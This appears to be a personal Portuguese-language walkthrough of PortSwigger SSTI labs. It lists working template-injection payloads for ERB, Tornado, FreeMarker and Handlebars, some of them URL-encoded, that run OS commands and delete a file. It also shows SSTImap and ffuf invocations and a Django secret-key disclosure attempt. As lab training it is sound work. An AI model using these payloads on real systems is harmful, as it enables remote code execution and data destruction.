Vamos lá... Primeira tentativa com o primeiro laboratório:
## Plaintext context

```
%3C%{7*7}%%3E
```

```
<%{7*7}%>
```

![](../../../../media/Pasted%20image%2020240817132514.png)

```
<%=7*7 %>
```

Tentativa de automatizar o processo com ffuf:

```
ffuf -u https://0a87009804a0cef180652b5f005700f6.web-security-academy.net/?message=FUZZ -w /usr/share/seclists/Fuzzing/template-engines-expression.txt -mr 1764
```

Sem sucesso


Payload utilizado:

```
%3C%File.delete(%27/home/carlos/morale.txt%27)%%3E
```

ou sem o URL encvode:

```
<%File.delete('/home/carlos/morale.txt')%>
```

![](../../../../media/Pasted%20image%2020240817135043.png)

## Code context

```
teste@teste.com}}{% import os %}{{ os.remove("/home/carlos/morale.txt") }}
```

```
teste%40teste.com}}{%25+import+os+%25}{{+os.remove("/home/carlos/morale.txt")
```

Um próximo teste seria simplesmente desconsiderar o fechamento das chaves:

```
{%%20import%20os%20%}{{os.remove('/home/carlos/morale.txt')
```

```
teste%40teste.com"{%%20import%20os%20%}{{os.remove('/home/carlos/morale.txt')
```

![](../../../../media/Pasted%20image%2020240818144446.png)

```
teste%40teste.com"}}{%%20import%20os%20%}{{os.remove('/home/carlos/morale.txt')}}
```
![](../../../../media/Pasted%20image%2020240818144628.png)


```
user.name"}}{%%20import%20os%20%}{{os.remove('/home/carlos/morale.txt')+"
```

Fazendo uma análise do que houve, cheguei a seguinte conclusão. Vamos analisar de uma perspectiva de deenvolvedor.

```
engine.render("Hello {{"+user.name+"}}{{%import os%}{{os.remove('home/carlos/morale.txt')+"}}", data)
```


Porém, notei que era necessário fazer a chamada para cada vez que eu fizesse um comentário no post. Logo, o payload já exercitado anteriormente funcionou. Para tal, seguir os seguintes passos:


No preferred name, informar o seguinte payload:

![](../../../../media/Pasted%20image%2020240818160009.png)

```
user.name}}{%import os%}{{os.remove('/home/carlos/morale.txt')
```

![](../../../../media/Pasted%20image%2020240818160033.png)


![](../../../../media/Pasted%20image%2020240818155932.png)

![](../../../../media/Pasted%20image%2020240818155940.png)

## Server-side template injection using documentation

![](../../../../media/Pasted%20image%2020240818160854.png)

Notei que isso é Java, portanto, verificando no PayloadAllTheThings, chegamos ao seguinte payload:


```
${T(java.lang.Runtime).getRuntime().exec('rm /home/carlos/morale.txt')}
```

![](../../../../media/Pasted%20image%2020240818161037.png)
```
${File f= new File("/home/carlos/morale.txt");f.delete()}
```

![](../../../../media/Pasted%20image%2020240818161402.png)

```
${class.getResource("/home/carlos/morale.txt").delete()}
```

![](../../../../media/Pasted%20image%2020240818161506.png)


```
${T(java.io.File)("/home/carlos/morale.txt").delete()}
```

O engine é freemarker, então mudei a abordagem utilizando o seguinte payload:

```
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```

Essa inspiração partiu da seguinte fonte:

<https://medium.com/@armaanpathan/breaking-the-barrier-remote-code-execution-via-ssti-in-freemarker-template-engine-9797079752ac>

![](../../../../media/Pasted%20image%2020240818164001.png)

## Server-side template injection in an unknown language with a documented exploit

O objetivo aqui é utilizar de um exploit já conhecido. Para tal, precisamos primeiro identificar o engine que está sendo utilizado. Utilizei duas abordagens, sendo que uma delas não foi possível de resolver o problema:

SSTIMap

```
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap/
python3 -m venv sstimap_env
source sstimap_env/bin/activate
pip install -r requirements.txt
sudo ln -s /home/acosta/work/Area_de_trabalho/tools/web/3_exploitation/SSTImap/sstimap.py /home/acosta/.local/bin/sstimap
```

```
sstimap -u https://0ad500ff04819e388072717b00cc00b4.web-security-academy.net/?message=*
```

```
sstimap -u https://0ad500ff04819e388072717b00cc00b4.web-security-academy.net/?message=* --os-cmd "rm /home/carlos/morale.txt" -e Dust
```
![](../../../../media/Pasted%20image%2020240818173026.png)

```
sstimap -u https://0ad500ff04819e388072717b00cc00b4.web-security-academy.net/?message=* --os-cmd "rm /home/carlos/morale.txt"
```
![](../../../../media/Pasted%20image%2020240818173427.png)

A outra maneira de conduzir esse teste foi da seguinte maneira. Informar o polyglot:

```
${{%3C%[%%27%22}}%\
```


![](../../../../media/Pasted%20image%2020240818173245.png)

Dessa forma podemos notar que se trata de um framework do "node/javascript" (Handlebars):


![](../../../../media/Pasted%20image%2020240818173607.png)

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Vamos passar pelo processo de URL encode:

![](../../../../media/Pasted%20image%2020240818173702.png)

```
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%53%79%6e%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

![](../../../../media/Pasted%20image%2020240818173739.png)


(Desconsiderar o erro, visto que já tinha executado o comando antes)

## Server-side template injection with information disclosure via user-supplied objects

Aqui o objetivo era conseguir a SECRET_KEY do Django. 



![](../../../../media/Pasted%20image%2020240826234552.png)

```
${42*42}
```

Só com esse payload foi possível conseguir verificar o resultado. A considerar que o polyglot não foi uma solução adequada para achar a vulnerabilidade.